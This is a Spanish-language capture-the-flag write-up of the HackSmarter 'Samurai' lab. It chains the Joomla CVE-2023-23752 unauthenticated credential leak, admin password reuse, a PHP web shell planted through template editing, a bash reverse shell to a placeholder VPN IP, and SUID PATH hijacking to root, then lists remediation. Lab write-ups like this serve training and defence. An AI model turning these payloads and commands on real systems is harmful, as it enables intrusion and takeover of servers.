# Write-up — Samurai (HackSmarter)

| | |
|---|---|
| **Plataforma** | HackSmarter |
| **Objetivo** | Samurai |
| **Dificultad** | Easy · Linux |
| **Activo (mi instancia)** | `http://10.1.8.167` |
| **Equipo** | VØIDFLAG |
| **Fecha** | 2026-10-21 |
| **Resultado** | Foothold como `www-data` (validado por mí) → root (vía SUID, de la cadena del equipo) |

> **Nota sobre las IPs:** HackSmarter despliega una instancia por usuario. Mi máquina es `10.1.8.167`; un compañero resolvió la suya en `10.1.138.32` (hostname `streetcoder`). Los hallazgos y la técnica son idénticos; las direcciones cambian por instancia.

---

## Resumen ejecutivo

La cadena de compromiso completa, de principio a fin:

1. Una web estática "Samurai" oculta una instalación **Joomla 4.2.5** completa.
2. Joomla 4.2.5 es vulnerable a **CVE-2023-23752**: su API REST expone la configuración **sin autenticación**, filtrando usuario y contraseña de la base de datos en claro.
3. Esa contraseña está **reutilizada** en la cuenta Super User del panel `/administrator/`.
4. Con acceso de administrador, se **edita una plantilla** para insertar PHP y obtener **ejecución remota de comandos (RCE)** como `www-data`.
5. `www-data` puede ejecutar como root (vía sudo/SUID) un binario **`DbMaria`** que invoca `mariadb-dump` **sin ruta absoluta** → **PATH hijacking** → **root**.

**Cadena:** Fuga de credenciales sin auth → Toma del panel admin → RCE → Escalada por SUID/PATH → root.

---

## 1. Reconocimiento

### Puertos

Barrido completo y luego versiones sobre los puertos abiertos:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Samurai
```

- **SSH 8.9p1** parcheado y al día → descartado como vector.
- **Apache 2.4.52** en el 80 → vector principal.

### La web

La home muestra una página "Samurai" con una lista de espadas (Katana, Wakizashi, Tachi, Tanto) y el texto *"Craft your sword."*. 

**Falso positivo descartado:** probé las espadas como rutas/ficheros. Todas devolvían **200 con el mismo tamaño (3185 bytes)**, igual que un nombre inventado (`basura_inventada`). Eso confirma un **catch-all**: el servidor responde la home ante cualquier ruta inexistente. La lista de espadas era una distracción.

### Fuzzing filtrando el catch-all

La clave fue fuzzear excluyendo el tamaño de la home (3185 bytes), para que solo apareciera lo que realmente era distinto:

```bash
gobuster dir -u http://10.1.8.167 -w common.txt -x php,txt,html -b 200,403,404 --exclude-length 3185
```

Resultado: estructura inconfundible de **Joomla**:

```
administrator/   api/   cache/   components/   images/   includes/
language/   layouts/   media/   modules/   plugins/   templates/   tmp/
api/experiments.php  (406)
```

El `406` en `api/experiments.php` ya apuntaba a un endpoint `/api/` activo de Joomla 4.

---

## 2. Fingerprint de versión

La versión exacta está en texto plano en el manifiesto:

```bash
curl -s http://10.1.8.167/administrator/manifests/files/joomla.xml
```

```xml
<version>4.2.5</version>
```

**Joomla 4.2.5** → dentro del rango vulnerable de CVE-2023-23752 (4.0.0 – 4.2.7).

---

## 3. CVE-2023-23752 — Fuga de credenciales sin autenticación

El endpoint de configuración de la API es accesible sin login. El detalle que hizo que funcionara fue la cabecera `Accept` con el MIME exacto de la API de Joomla: `application/vnd.api+json` (con `application/json` devolvía *"Could not match accept header"*).

```bash
curl -s -H 'Accept: application/vnd.api+json' \
  'http://10.1.8.167/api/index.php/v1/config/application?public=true'
```

Credenciales de base de datos obtenidas (SENSIBLE — solo canal del equipo):

| Campo | Valor |
|---|---|
| dbtype | mysqli |
| host | localhost |
| user | `joomla425` |
| password | `[REDACTED en el reporte público]` |
| db | `Dbjoomla` |
| dbprefix | `iemj4_` |

El mismo fallo permite enumerar usuarios:

```bash
curl -s -H 'Accept: application/vnd.api+json' \
  'http://10.1.8.167/api/index.php/v1/users?public=true'
```

```json
{ "id": 769, "name": "Oda", "username": "Miyamoto",
  "email": "oda@local.local", "group_names": "Super Users" }
```

> MySQL solo escucha en localhost (3306 cerrado al exterior), así que la credencial no sirve contra la BD directamente. La idea ganadora es la **reutilización de contraseña**.

---

## 4. Acceso inicial — Toma del panel y RCE

La contraseña de la BD **también** es la del Super User. Login válido en:

```
http://10.1.8.167/administrator/   →   usuario: Miyamoto   /   pass: (la filtrada)
```

Con acceso de administrador, Joomla permite editar el código de la plantilla
(**System → Site Templates → Cassiopeia**). Creé un archivo PHP en la plantilla:

```php
<?php echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; ?>
```

Y lo invoqué directamente:

```bash
curl -s 'http://10.1.8.167/templates/cassiopeia/shell.php?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE como `www-data` confirmado.**

> **Troubleshooting que viví:** editar `index.php` de la plantilla no dio salida (Joomla carga ese archivo por framework, no se sirve suelto). La solución fiable fue **crear un archivo nuevo** (`shell.php`) dentro de la plantilla, que sí se sirve directamente en `/templates/cassiopeia/`. Para ver salida con seguridad conviene `echo "<pre>"` + `$_REQUEST` (acepta GET y POST).

Reverse shell para una sesión interactiva:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/MI_IP_VPN/4444 0>&1'"); ?>
```

```bash
# en mi máquina
nc -lvnp 4444
```

La **flag de usuario** está en `/var/www/user.txt`.

---

## 5. Escalada de privilegios a root

> Esta sección proviene de la cadena resuelta por un compañero del equipo sobre su
> instancia (`streetcoder`). La técnica es la misma para todas las instancias; yo validé
> hasta el foothold `www-data`.

`sudo -l` como `www-data` revela un único permiso sin contraseña:

```
User www-data may run the following commands on streetcoder:
    (root) NOPASSWD: /opt/backup/DbMaria
```

El binario es además SUID root:

```
$ ls -la /opt/backup/
-rwsr-xr-x 1 root root 16128 Mar  6  2026 DbMaria
$ file /opt/backup/DbMaria
setuid ELF 64-bit LSB pie executable, dynamically linked, not stripped
```

`strings` muestra el comando que ejecuta:

```
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

Llama a `mariadb-dump` **por nombre, sin ruta absoluta**. Ese es el fallo.

**Intentos que fallaron (documentados):**
- *PATH hijack vía `sudo`*: `env_reset` + `secure_path` en sudoers reemplazan el PATH, así que por sudo se ejecuta el `mariadb-dump` real.
- *Inyección de comandos en el argumento*: el argumento llega a `mariadb-dump` como nombre de base de datos (`error 1102: Incorrect database name`), no hay shell intermedia.

**Lo que funcionó** — ejecutar el binario **sin `sudo`**: el bit SUID ya otorga root y, sin sudo, **mi PATH sobrevive**:

```bash
cd /tmp
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/mariadb-dump
chmod +x /tmp/mariadb-dump
export PATH=/tmp:$PATH
/opt/backup/DbMaria Dbjoomla      # ejecuta mi mariadb-dump falso como root
/bin/bash -p                      # euid root preservado
id                                # uid=33 euid=0
cat /root/root.txt
```

El `mariadb-dump` falso corre como root y pone el SUID en `/bin/bash`; `bash -p` mantiene el euid root → **root**.

---

## 6. Hallazgos registrados

| # | Hallazgo | Tipo | Severidad | Estado |
|---|---|---|---|---|
| 1 | Joomla oculto tras front estático (catch-all) | Information Disclosure | Info | Confirmado |
| 2 | CVE-2023-23752: fuga de config/credenciales sin auth | Broken Access Control | Alta (CVSS 7.5) | Confirmado |
| 3 | Enumeración de usuarios vía API | Information Disclosure | Media | Confirmado |
| 4 | Reutilización de contraseña BD ↔ Super Admin | Credential Reuse | Alta | Confirmado |
| 5 | RCE autenticado vía edición de plantilla | Remote Code Execution | Crítica | Confirmado |
| 6 | SUID + PATH hijack en `/opt/backup/DbMaria` | Privilege Escalation | Crítica | Confirmado (equipo) |

---

## 7. Remediación (resumen)

- **Actualizar Joomla** a ≥ 4.2.8 (corrige CVE-2023-23752); restringir el acceso a `/api/`.
- **No reutilizar** la contraseña de BD para cuentas de aplicación/usuario.
- Restringir la **edición de plantillas** en producción (deshabilitar el editor de código del panel).
- El binario `DbMaria` debe **invocar `mariadb-dump` con ruta absoluta** y no ser SUID; revisar la necesidad del `NOPASSWD`.

---

*No compartir fuera del equipo mientras la disclosure policy no lo permita.*
